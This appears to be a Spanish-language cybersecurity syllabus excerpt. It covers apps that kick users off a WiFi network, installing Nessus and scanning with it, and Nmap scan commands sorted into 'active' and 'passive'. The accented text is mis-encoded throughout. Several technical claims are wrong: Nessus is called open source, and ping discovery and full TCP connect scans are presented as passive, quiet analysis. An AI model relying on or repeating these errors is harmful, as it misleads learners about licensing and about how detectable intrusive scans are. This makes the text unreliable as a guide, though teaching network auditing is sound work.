## **Usa aplicaciones para expulsar usuarios de la red WiFi**

Tambi√©n podemos utilizar programas externos. Un ejemplo es **NetCut**, del que hablamos en un art√≠culo anterior. Este software nos permite tener un control sobre todos los **equipos que hay conectados** en nuestro router.

En caso de que queramos echar a uno en concreto, podemos hacerlo f√°cilmente con esta aplicaci√≥n. Una utilidad m√°s que tenemos disponible. Eso s√≠, en este caso hay que tener en cuenta que vamos a tener que instalar software adicional en nuestro equipo. Hay que bajarlo siempre desde fuentes oficiales y no cometer errores que puedan afectar a nuestra seguridad.

NetCut es un programa interesante que nos permite expulsar a un usuario de la red inal√°mbrica. No obstante, podemos hacer uso de otros programas que son similares y que tambi√©n podemos encontrar de forma gratuita en Internet. Existe un amplio abanico de posibilidades para los diferentes sistemas operativos.

### **Fing para m√≥viles**

Una de las primeras cosas que debemos hacer si queremos saber qui√©n accede a nuestro router es ver las diferentes conexiones. Podemos hacerlo f√°cil desde el propio dispositivo y accediendo a la configuraci√≥n, pero tambi√©n podemos usar una aplicaci√≥n espec√≠fica que nos ayude a saber qui√©n se est√° conectando y desde qu√© dispositivo. Fing es una aplicaci√≥n que nos permite comprobar de forma sencilla si alguien est√° usando **nuestro Internet si eres principiante** y no sabes c√≥mo puedes consultarlo siguiendo otros pasos.

Fing permite **encontrar intrusos y tambi√©n bloquear el acceso** de forma permanente o temporal. Es una aplicaci√≥n para Android e iOS que podemos descargar gratis en nuestro smartphone y que nos permite detectar todos los aparatos conectados a la red WiFi.

> Descargar
> 
> 
> [Fing - Esc√°ner de red](https://apps.apple.com/es/app/fing-esc%C3%A1ner-de-red/id430921107?uo=4)
> 
> [Descargar](https://play.google.com/store/apps/details?id=com.overlook.android.fing)
> 
> [Fing - Esc√°ner de red](https://play.google.com/store/apps/details?id=com.overlook.android.fing)
> 

Simplemente tienes que descargar la aplicaci√≥n en tu tel√©fono m√≥vil y encenderla. Autom√°ticamente detectar√° los dispositivos que est√©n conectados a la red y los mostrar√° en una lista que podr√°s ver en tu tel√©fono: el tipo de aparato que es (m√≥vil, televisi√≥n, videoconsola, dispositivo, altavoces inteligentes‚Ä¶) y tambi√©n nos mostrar√° la marca, el modelo y **la direcci√≥n IP privada** del dispositivo dentro de nuestra red.

Podemos tocar dentro del que queramos para leer m√°s detalles sobre ese aparato, el modelo, la fecha de lanzamiento, el sistema operativo‚Ä¶ Y podemos acceder a los ajustes o administrar el dispositivo: podemos eliminarlo de la lista, podemos hacer ping o acceder a una cronolog√≠a donde se ven los diferentes accesos. As√≠ de f√°cil ser√°, con esta app, bloquear a alguien que nos est√° robando Internet y evitar cuanto antes que sigan rob√°ndonos Internet en casa.

### **RedBox - Network Scanner**

- Precio: Gratis
- Categor√≠a: Herramientas
- Desarrollador: [The RedBox Project](https://play.google.com/store/apps/dev?id=6416089970222547223)
- Descargar: [Para Android en Google Play](https://play.google.com/store/apps/details?id=com.redbox.redboxnetworkscanner)

### **Ventajas de expulsar usuarios**

Los usuarios no autorizados pueden ser una gran fuente de problemas para nuestra red Wi-Fi, y para nuestra propia seguridad en muchos casos. Expulsarlos nos aporta diferentes beneficios muy importantes para mantener nuestra seguridad y privacidad, as√≠ como para que la red funcione de la forma adecuada. Estos beneficios son:

- **Mayor seguridad**

Es importante que tengamos buena seguridad en nuestra red evitando que haya intrusos y expuls√°ndolos en el momento. Cuando a nuestra red Wi-Fi accede alg√∫n usuario no autorizado, puede resultar en una amenaza para la seguridad de la misma y para nosotros. El acceso a datos de los dem√°s usuarios, es mucho m√°s sencillo. Por lo cual pueden robar informaci√≥n personal, o causar otro tipo de da√±os en el sistema. O incluso provocar alg√∫n tipo de problema o cometer alg√∫n delito, desde nuestra propia red. Al expulsarlos, reducimos esta posibilidad de una forma muy considerable. Ya que, si se comete alg√∫n delito desde la red, el primer responsable ser√° el titular de la misma.

- **Mejor velocidad**

Cuantos m√°s usuarios se encuentren dentro de la red, menor ser√° la velocidad y ancho de banda que se puede repartir. Esto se notar√° cuando utilicemos nuestra conexi√≥n a Internet para llevar a cabo cualquier actividad, empeorando de forma considerable la calidad de la conexi√≥n. Expulsando a los usuarios, liberamos el ancho de banda que estaban utilizando mejorando as√≠ la velocidad y el rendimiento general de la red.

- **Mayor privacidad**

Expulsando usuarios no autorizados, reducimos mucho la posibilidad de que estos **puedan acceder a la informaci√≥n personal**, la cual puede ser muy sensible. Al expulsarlos, mejoramos la privacidad de todos los usuarios de forma considerable. Es una buena forma de protegernos y de evitar que se realicen todo tipo de pr√°cticas con nuestra direcci√≥n IP o usando nuestro acceso a Internet para ello.

- **Cumplir normativas**

Cuando se trata de alguna empresa u organizaci√≥n, tener usuarios no autorizados puede hacer que se est√© incumpliendo alguna normativa o regulaci√≥n. Expulsando a estos usuarios, nos aseguramos de que cumplimos con todo lo establecido en estas regulaciones. Reduciendo as√≠ el riesgo de que llegue alguna multa o sanci√≥n.

## Gesti√≥n de vulnerabilidades con Nessus

### **Nessus ¬øC√≥mo hallar vulnerabilidades?**

Nessus es una herramienta muy utilizada durante un Pentesting, espec√≠ficamente, en la fase de Escan√©o. Este post estar√° dividido en dos partes: la primera consiste en una muy breve rese√±a de Nessus como producto y, en la segunda parte, se realiza una demostraci√≥n de Nessus.

Nessus es el motor de detecci√≥n de vulnerabilidades perteneciente a la empresa Tenable y es pr√°cticamente el standard como herramienta para este proceso. Existen otras herramientas similares para realizar el hallazgo de vulnerabilidades, algunas con versiones gratuitas como OpenVAS y otras con muy buen desempe√±o como es Qualys.

Tenable permite utilizar su versi√≥n gratuita del motor de detecci√≥n de vulnerabilidades Nessus para peque√±os entornos, lo que a la vez permite empezar a interiorizarse en proceso de gesti√≥n de vulnerabilidades. Es por esto que realizaremos la instalaci√≥n de Nessus en un entorno Windows como prueba de concepto y como laboratorio de pr√°ctica, sin que adem√°s esto impida su utilizaci√≥n en un ambiente de peque√±a red como por ejemplo en un hogar o un peque√±o negocio.

Las amenazas siempre estar√°n presentes tanto a nivel externo como interno en cualquier tipo de equipo pero sin duda que cuando se habla de entornos corporativos o de equipos donde existe informaci√≥n confidencial y extremadamente delicada, se corre el riego de que el robo de informaci√≥n se convierta en un verdadero dolor de cabeza. Para prevenir esto existe una distribuci√≥n de Linux que esta desarrollada especialmente para todos los temas relacionados con an√°lisis de vulnerabilidades.

<aside>
üí° Kali Linux entrega al usuario m√°s de 600 herramientas de penetraci√≥n, pero esta cantidad puede aumentarse usando herramientas extras y una de las m√°s llamativas es Nessus.
</aside>

![Kali Linux 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux1.png?raw=true)

### **¬øQu√© es Nessus?**

Es una herramienta utilizada principalmente para escanear vulnerabilidades, es desarrollada y mantenida por [Tenable](https://www.tenable.com/). Tiene un motor para escanear los objetivos que se basa en plugins; los plugins son peque√±os programas escritos en un lenguaje de scripting denominado **Nessus Attack Scripting Language (NASL)** que le indican al motor que es lo que debe evaluar en el objetivo, con el fin de determinar las fallas del mismo.

Nessus se ha desarrollado como una herramienta de escaneo de seguridad remota la cual hace el escaneo al equipo remoto para generar las alertas y en caso de detectar alguna vulnerabilidad que ponga en riesgo tanto la informaci√≥n como los datos all√≠ alojados. Para ello realiza m√°s de 1200 verificaciones en el destino para analizar hasta el √∫ltimo byte la presencia de alg√∫n software que sea perjudicial.

### **¬øCu√°ntos plugins tiene Nessus y qui√©n los desarrolla?**

En la actualidad Nessus tiene m√°s de 133.088 plugins, la mayor parte de estos plugins es desarrollado por la gente de Tenable y unos cuantos por la comunidad.

### **¬øQu√© tipo de licencias existen?**

Al momento de pensar en adquirir Nessus se va a encontrar con las siguientes opciones:

- **nessus essentials**: Una versi√≥n que est√° pensada para uso casero, puede realizar escaneos hasta en 16 direcciones IP
- **nessus professional:** Una versi√≥n comercial que permite realizar escaneos a host ilimitados, est√° enfocada a consultores y Pen Testers
- **tenable.io:** Esta versi√≥n est√° m√°s enfocada a la gesti√≥n de vulnerabilidades en compa√±√≠as de cualquier tama√±o.

### Principales caracter√≠sticas de Nessus

Dentro de las principales caracter√≠sticas de Nessus destacamos:

- Nessus hace un an√°lisis completo de la configuraci√≥n del servidor y no se queda solo en los an√°lisis tradicionales
- Dispone de informaci√≥n actualizada sobre nuevas vulnerabilidades y ataques que puedan poner en riesgo los datos e informaci√≥n
- Nessus es de c√≥digo abierto
- Nessus est√° en la capacidad de ser implementado diversas plataformas incluyendo Raspberry Pi
- Dispone de complementos compilados din√°micamente para mejorar el rendimiento y la eficiencia de las tareas de escaneo
- Integra m√°s de 450 plantillas preconfiguradas para una mejor administraci√≥n de las vulnerabilidades a detectar
- Podemos crear reportes personalizados para obtener acceso a la informaci√≥n generada

<aside>
üìñ Nessus trabaja haciendo un an√°lisis en cada puerto del equipo para determinar el tipo de servicio que est√° en ejecuci√≥n y de este modo realizar pruebas para validar que el servicio no tenga o presente vulnerabilidades que afecten la normal operaci√≥n.
</aside>

### Requisitos m√≠nimos

Los requisitos m√≠nimos para usar Nessus son:

- CPU de 4 n√∫cleos con velocidad de 2 GHz
- RAM de 4 GB recomendado 8 GB
- Espacio en disco duro de 30 GB

### Sistemas operativos disponibles

Nessus, aparte de Kali, puede ser instalado en sistemas operativos como:

- Debian 9, 10 / Kali Linux 2017 y Rolling (86x, i386)
- Red Hat 6, 7 8
- FreeBSD 11, 12
- SUSE Enterprise 11 SP4, 12 SP3
- Ubuntu 14 al 18
- Windows 7 al 11
- Mac OS X 10.9, 10.10, 10.11, 10.12, 10.13, 10,14, 10.15, 11.x y 12

### Navegadores

Adicional puede ser usado en los siguientes navegadores:

- Google Chrome (50+)
- Safari (10+)
- Mozilla Firefox (50+)

Ahora te ense√±ar√° c√≥mo instalar Nessus en Kali Linux y gestionar equipos remotos para detectar sus vulnerabilidades.

## **¬øC√≥mo instalar Nessus en Kali Linux?**

Vamos a la URL de Nessus para descargar el respectivo instalador: [NESSUS](https://www.solvetic.com/tutoriales/article/11878-como-instalar-y-usar-nessus-en-kali-linux/Nessus)

![Kali Linux 2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux2.png?raw=true)

Damos clic en el instalador de Debian para 64 bits:

![Kali Linux 3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux3.png?raw=true)

Aceptamos los t√©rminos de la licencia:

![Kali Linux 4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux4.png?raw=true)

Este archivo lo guardamos localmente. Abrimos la terminal de Kali Linux, accedemos a Descargas: usando el comando:

> cd Descargas

Listamos el contenido con "ls":

![Kali Linux 5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux5.png?raw=true)

Instalamos Nessus con el comando:

`sudo dpkg -i archivo.deb`

Ingresamos la contrase√±a y esperamos que finalice el proceso:

![Kali Linux 6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux6.png?raw=true)

Iniciamos el servicio de Nessus:

`sudo /bin/systemctl start nessusd.service`

Una vez iniciado, abrimos un navegador e ingresamos a Nessus:

`https://kali:8834`

Veremos lo siguiente:

![Kali Linux 7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux7.png?raw=true)

Damos clic en "Advanced" y luego damos clic en "Accept the Risk and Continue" para ir a Nessus:

![Kali Linux 8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux8.png?raw=true)

Este ser√° el entorno inicial de Nessus:

![Kali Linux 9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux9.png?raw=true)

Seleccionamos "Nessus Essentials" y luego damos clic en "Continue", ingresamos el usuario a crear con un correo v√°lido, damos clic en "Email" y luego Ingresamos el c√≥digo recibido en el correo registrado:

![Kali Linux 10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux10.png?raw=true)

Asignamos el usuario y contrase√±a de Nessus. Damos clic en "Submit" y se iniciar√° el proceso de descarga de los complementos:

![Kali Linux 11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux11.png?raw=true)

Ahora se lleva a cabo el proceso de compilaci√≥n de los componentes.¬† Esperamos que el proceso, el cual tarda, vaya finalizando:

![Kali Linux 12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux12.png?raw=true)

Al finalizar veremos lo siguiente:

![Kali Linux 13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux13.png?raw=true)

Cierra la ventana emergente para ver el entorno de Nessus:

![Kali Linux 14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-linux14.png?raw=true)

### **Escanear y buscar vulnerabilidades con Nessus**

Damos clic en "New Scan" y seleccionamos el tipo de escaneo a usar, como vemos las opciones son variadas:

![Nessus1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus1.png?raw=true)

**Las opciones de escaneo que nos ofrece Nessus son:**

- Host Discovery: Ejecuta un escaneo sencillo para descubrir hosts activos y puertos abiertos
- Basic Network Scan: Hace un an√°lisis completo del sistema necesario para cualquier host seleccionado, es ideal para analizar vulnerabilidades internas
- Advanced Scan: Este an√°lisis permite personalizar la configuraci√≥n del escaneo
- Advanced Dynamic Scan: Permite configurar filtros de complementos din√°micos sin tener que hacerlo de forma manual
- Malware Scan: Como su nombre lo indica, busca malware en sistemas Windows y Unix
- Mobile Device Scan: Permite realizar an√°lisis a dispositivos m√≥viles usando Microsoft Exchange o un MDM
- Web Application Tests: Es funcional para buscar vulnerabilidades web publicadas y no publicadas o desconocidas
- Credentialed Patch Audit: Ejecuta una auditor√≠a de parches con credenciales
- Intel AMT Security Bypass: Se encarga de realizar comprobaciones remotas y locales para CVE-2017-5689
- Spectre and Meltdown: Se encarga de llevar a cabo verificaciones remotas y locales para CVE-2017-5753, CVE-2017-5715 y CVE-2017-5754
- WannaCry Ransomeware: Busca el famoso ransomware WannaCry
- Ripple20 Remote Scan: Ubica equipos que ejecutan la pila Treck en la red
- Zerologon Remote Scan: Detecta la vulnerabilidad de elevaci√≥n de privilegios (Zerologon) propia de Microsoft Netlogon
- Solarigate: Permite encontrar vulnerabilidades de SolarWinds Solorigate usando comprobaciones remotas y locales
- ProxyLogon: MS Exchange: ejecuta comprobaciones remotas y locales para detectar vulnerabilidades de Microsoft Exchange Server
- PrintNightmare: Hace an√°lisis y verificaciones locales para CVE-2021-34527, es una vulnerabilidad PrintNightmare Windows Print Spooler
- Active Directory Starter Scan: Busca configuraciones incorrectas en Active Directory
- Log4Shell: Puede detectar la vulnerabilidad Log4Shell en Apache Log4j
- Compliance: Hace una auditor√≠a de la infraestructura de la nube y audita la configuraci√≥n de servicios en la nube de terceros
- Internal PCI Network Scan: Lleva a cabo un an√°lisis de vulnerabilidad PCI DSS interno
- MDM Config Audit: Audita la configuraci√≥n de los administradores de dispositivos m√≥viles MDM
- Offline Config Audit: Hace una auditoria de la configuraci√≥n de los dispositivos de red locales
- Policy Compliance Auditing: Lleva a cabo una auditoria de las configuraciones del sistema tomando como base una l√≠nea de base existente
- SCAP and OVAL Auditing: Analiza sistemas de auditor√≠a a trav√©s de definiciones SCAP y OVAL

Podemos ver como las opciones son variadas y funcionales.

Damos clic en "Basic Network Scan" para un escaneo b√°sico e ingresamos los detalles del escaneo con la IP objetivo:

![Nessus2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus2.png?raw=true)

![Nessus3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus3.png?raw=true)

Damos clic en "Save" para guardar este proyecto:

![Nessus4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus4.png?raw=true)

Damos clic en el icono "Launch" para iniciar el escaneo en el equipo de destino:

![Nessus5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus5.png?raw=true)

Esperamos que el escaneo sea realizado, al finalizar pulsamos sobre el objetivo para ver las vulnerabilidades encontradas:

![Nessus6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus6.png?raw=true)

Cada una estar√° dividida por colores en base a su nivel de riesgo indicando la cantidad y al lado podemos ver una representaci√≥n de estas, damos clic sobre alguna secci√≥n para ver m√°s espec√≠ficamente las vulnerabilidades detectadas:

![Nessus7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus7.png?raw=true)

Es posible ver un resumen de todas las vulnerabilidades de ese tipo y damos clic en alg√∫n elemento para tener acceso a detalles m√°s completos:

![Nessus8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus8.png?raw=true)

Es posible guardar un reporte del an√°lisis ejecutado, para ello damos clic en "Report":

![Nessus9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus9.png?raw=true)

Se abrir√° la siguiente ventana donde seleccionamos el formato y detalles a usar:

![Nessus10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus10.png?raw=true)

Damos clic en "Generate Report" y despu√©s de creado lo abrimos o guardamos. Este reporte contendr√° todo el resultado generado por Nessus. Navegamos por las diferentes paginas para ver los resultados:

![Nessus11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus11.png?raw=true)

Nessus es una valiosa herramienta de escaneo remoto para encontrar vulnerabilidades y tomar acciones sobre ellas antes que sea tarde.

# Instalaci√≥n de Nessus Essentials en Windows 10

1. Descargar Nessus Essentials: [nessus](https://es-la.tenable.com/products/nessus)

![Nessus12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus12.png?raw=true)

2. Un correo electr√≥nico: ser√° la direcci√≥n en la cual recibiremos el c√≥digo de activaci√≥n de Nessus

## Instalaci√≥n

Si nos registramos en el sitio para iniciar la prueba recibiremos un correo con la licencia y un link de descarga para diversas plataformas

![Nessus13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus13.png?raw=true)

Descargamos para el Sistema Operativo que corresponda, en este caso para Windows:

![Nessus14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus14.png?raw=true)

Una vez descargado procedemos a la instalaci√≥n:

![Nessus15](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus15.png?raw=true)

Next:

![Nessus16](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus16.png?raw=true)

Aceptar la licencia:

![Nessus17](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus17.png?raw=true)

Escoger el directorio de destino:

![Nessus18](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus18.png?raw=true)

Install (luego aceptar cuando Windows consulte si desea que esta aplicaci√≥n realice cambios en el equipo):

![Nessus19](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus19.png?raw=true)

Esperamos que termine la instalaci√≥n, podr√≠a solicitar la instalaci√≥n de componentes adicionales necesarios:

![Nessus20](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus20.png?raw=true)

![Nessus21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus21.png?raw=true)

![Nessus22](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus22.png?raw=true)

![Nessus23](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus23.png?raw=true)

El driver WinPcap debemos instalarlo con la opci√≥n de iniciarlo al inicial el sistema, tal como muestra la foto:

![Nessus24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus24.png?raw=true)

Finalizar la instalaci√≥n de componentes adicionales:

![Nessus25](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus25.png?raw=true)

Finalizar la instalaci√≥n de Nessus:

![Nessus26](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus26.png?raw=true)

Luego inciar el navegador del sistema en localhost:8834

![Nessus27](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus27.png?raw=true)

Como el certificado de conexi√≥n segura es auto firmado debemos aceptar la opci√≥n de ingresar a pesar de las advertencias de seguridad:

![Nessus28](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus28.png?raw=true)

En la siguiente etapa escogemos Nessus Essentials:

![Nessus29](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus29.png?raw=true)

Como ya tenemos nuestro c√≥digo de activaci√≥n, en este caso presionamos Skip, caso contrario en esta etapa se puede solicitar un c√≥digo de activaci√≥n que llegar√° al correo electr√≥nico indicado:

![Nessus30](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus30.png?raw=true)

Ingresamos el c√≥digo de activaci√≥n:

![Nessus31](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus31.png?raw=true)

Creamos una cuenta de usuario administrador, en este ejemplo le puse de nombre "admin" :

![Nessus32](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus32.png?raw=true)

Esperamos que compile el resto del sistema y actualice la informaci√≥n de vulnerabilidades:

![Nessus33](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus33.png?raw=true)

![Nessus34](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus34.png?raw=true)

Una vez que esto est√© completado, en la primera vez que ingresemos nos solicitar√° que ingresemos nuestro segmento de red actual para realizar una b√∫squeda de equipos, generalmente la red dom√©stica es 192.168.0.0/24. En mi caso es 192.168.1.0/24, esto se puede ver f√°cilmente en Windows ingresando el comando ‚Äúipconfig‚Äù.

![Nessus35](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus35.png?raw=true)

Aqu√≠ tomamos los 3 primeros octetos de nuestra direcci√≥n de red como base, asumiendo que estamos en un segmento con m√°scara 24 (configuraci√≥n dom√©stica est√°ndard), por tanto el segmento de red que debo analizar es 192.168.1.0/24

![Nessus36](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus36.png?raw=true)

Una vez iniciada la b√∫squeda de activos aparecer√°n para seleccionar aquellos en los cuales desea realizar un an√°lisis de vulnerabilidades inicial:

![Nessus37](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus37.png?raw=true)

![Nessus38](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus38.png?raw=true)

Selecciono todos aquellos que se encuentren en mi red y quiero analizar, en mi caso no analizar√© la IP 1 ya que es la del router dom√©stico:

![Nessus39](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus39.png?raw=true)

Una vez que iniciemos el an√°lisis aparecer√°n los activos con los hallazgos correspondientes

![Nessus40](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus40.png?raw=true)

Una vez terminado este an√°lisis podremos ver que ya realizamos un descubrimiento de hosts y un an√°lisis b√°sico de la red, vamos a ‚ÄúMy Basic Network Scan‚Äù:

![Nessus41](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus41.png?raw=true)

Aparecer√°n todos los hosts analizados y sus vulnerabilidades

![Nessus42](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus42.png?raw=true)

Ingresando a los detalles de cada host podemos ver cuales son los hallazgos de cada uno

![Nessus43](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus43.png?raw=true)

Y posteriormente en cada vulnerabilidad:

![Nessus44](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus44.png?raw=true)

Tambi√©n podemos ver los detalles de cada vulnerabilidad y una sugerencia de remediaci√≥n:

![Nessus45](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nessus45.png?raw=true)

### **Conclusi√≥n**

Nessus Essentials es una forma relativamente simple para realizar b√∫squeda de vulnerabilidades en peque√±os entornos dom√©sticos o de peque√±os negocios, su capacidad gratuita de 16 IP m√°ximo permite realizar diversos tipos de b√∫squedas de agujeros de seguridad en nuestros equipos, ya la vez entrega la capacidad de conocer el c√≥mo solucionar estos problemas.

# Escaneo con Nmap: An√°lisis activo y pasivo

## **Diferencia entre an√°lisis activo y pasivo con Nmap**

![Nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nmap.png?raw=true)

Nmap (Network Mapper) es una herramienta de c√≥digo abierto utilizada para exploraci√≥n de redes y auditor√≠a de seguridad. En el contexto de Nmap, se pueden realizar an√°lisis activos y pasivos para obtener informaci√≥n sobre los sistemas en una red. Aqu√≠ hay una breve diferencia entre ambos:

## **An√°lisis Activo:**

**Definici√≥n**: El an√°lisis activo implica enviar paquetes directamente a los objetivos para obtener informaci√≥n sobre sus servicios, puertos y sistemas operativos.

<aside>
üëâ Ejemplo con Nmap: Nmap enviar√° paquetes de solicitud a los puertos de destino y analizar√° las respuestas para determinar si los puertos est√°n abiertos, qu√© servicios est√°n en ejecuci√≥n y posiblemente la versi√≥n del software.
</aside>

### Caracter√≠sticas:

- Es m√°s intrusivo ya que implica interactuar directamente con los sistemas objetivo.
- Puede ser detectado m√°s f√°cilmente por los sistemas de seguridad de red.

## **An√°lisis Pasivo:**

**Definici√≥n**: El an√°lisis pasivo implica escuchar o capturar el tr√°fico de red sin interactuar directamente con los sistemas objetivo.

<aside>
üëâ Ejemplo con Nmap: Nmap podr√≠a utilizar la opci√≥n -sn (Ping de Descubrimiento) para enviar paquetes de solicitud de ping y determinar la presencia de sistemas sin enviar paquetes directos a los puertos.
</aside>

### Caracter√≠sticas:

- Es menos intrusivo y generalmente m√°s discreto, ya que no env√≠a paquetes directamente a los sistemas objetivo.
- Puede ser m√°s dif√≠cil de detectar, ya que no interact√∫a directamente con los sistemas de la red.

### **Consideraciones Adicionales:**

> **Prop√≥sito:**

- El an√°lisis activo es m√°s adecuado cuando se necesita obtener informaci√≥n detallada y actualizada sobre los sistemas objetivo.
- El an√°lisis pasivo puede ser preferible cuando se busca recopilar informaci√≥n sin alertar a los sistemas objetivo.

> **Riesgos:**

- El an√°lisis activo puede generar tr√°fico en la red, lo que podr√≠a ser detectado y monitoreado por dispositivos de seguridad.
- El an√°lisis pasivo generalmente tiene menos riesgos de detecci√≥n, pero puede tener limitaciones en t√©rminos de la cantidad y calidad de la informaci√≥n recopilada.

> **Combinaci√≥n:**

- En muchos escenarios, se emplea tanto el an√°lisis activo como el pasivo para obtener una imagen m√°s completa de la red y sus sistemas.

<aside>
üìñ Tanto el an√°lisis activo como el pasivo tienen sus casos de uso y deben utilizarse de manera √©tica y legal, respetando las pol√≠ticas de seguridad y privacidad de la red objetivo.
</aside>

## **Ejemplos de an√°lisis activo con Nmap**

Aqu√≠ te proporciono algunos ejemplos de comandos Nmap para realizar an√°lisis activos, centr√°ndose en la exploraci√≥n de servicios y puertos en un objetivo espec√≠fico. Ten en cuenta que estos ejemplos son solo ilustrativos y debes asegurarte de tener la debida autorizaci√≥n para escanear cualquier red.

### Escaneo de Puertos B√°sico:

> nmap [objetivo]

Este comando realiza un escaneo de puertos b√°sico en el objetivo especificado.

### Escaneo de Puertos con Informaci√≥n del Servicio:

> nmap -sV [objetivo]

Proporciona informaci√≥n sobre los servicios que se est√°n ejecutando en los puertos encontrados.

### Escaneo de Puertos con Detecci√≥n de Sistema Operativo:

> nmap -O [objetivo]

Intenta detectar el sistema operativo del objetivo adem√°s de realizar un escaneo de puertos.

### Escaneo de Puertos en un Rango Espec√≠fico:

> nmap -p 1-100 [objetivo]

Limita el escaneo a un rango espec√≠fico de puertos (en este caso, del puerto 1 al 100).

### Escaneo Agresivo:

> nmap -A [objetivo]

Realiza un escaneo agresivo que incluye detecci√≥n de servicio, detecci√≥n de sistema operativo y scripts de secuencia de comandos.

### Escaneo de Puertos UDP:

> nmap -sU [objetivo]

Realiza un escaneo de puertos UDP, que son utilizados para servicios como DNS y DHCP.

### Escaneo de Puertos con Registro de Script:

> nmap -sC [objetivo]

Ejecuta scripts de detecci√≥n de servicios y vulnerabilidades.

### Escaneo de Puertos con Formato de Salida Espec√≠fico:

> nmap -oN resultado.txt [objetivo] 

Guarda los resultados en un archivo de texto espec√≠fico.

<aside>
üí° Recuerda sustituir [objetivo] con la direcci√≥n IP o el nombre de host del objetivo que est√°s evaluando. Ten presente que realizar escaneos activos en redes o sistemas sin la debida autorizaci√≥n puede violar pol√≠ticas de seguridad y leyes, as√≠ que siempre aseg√∫rate de contar con permisos antes de utilizar Nmap.
</aside>

## **Ejemplos de An√°lisis Pasivo con Nmap**

Nmap, por naturaleza, es m√°s conocido por realizar an√°lisis activos, ya que env√≠a paquetes a los sistemas objetivo para recopilar informaci√≥n. Sin embargo, hay algunas t√©cnicas que pueden considerarse m√°s pasivas en comparaci√≥n con un escaneo tradicional. Aqu√≠ te presento algunas opciones:

### Ping de Descubrimiento:

> nmap -sn [objetivo]

Este comando realiza un "Ping de Descubrimiento" para detectar sistemas activos sin enviar paquetes directos a puertos.

### Detecci√≥n de Sistemas Operativos sin Escaneo de Puertos:

> nmap -O --unprivileged [objetivo]

Realiza una detecci√≥n de sistemas operativos sin escanear puertos. Utiliza opciones "--unprivileged" para evitar requerir privilegios de root.

### Escaneo de Puertos TCP Connect:

> nmap -sT [objetivo]

El escaneo de puertos TCP Connect puede considerarse m√°s pasivo que otros m√©todos, ya que establece una conexi√≥n completa con el objetivo.

### Escaneo de Red sin Resolver Nombres de Host:

> nmap -n [red]

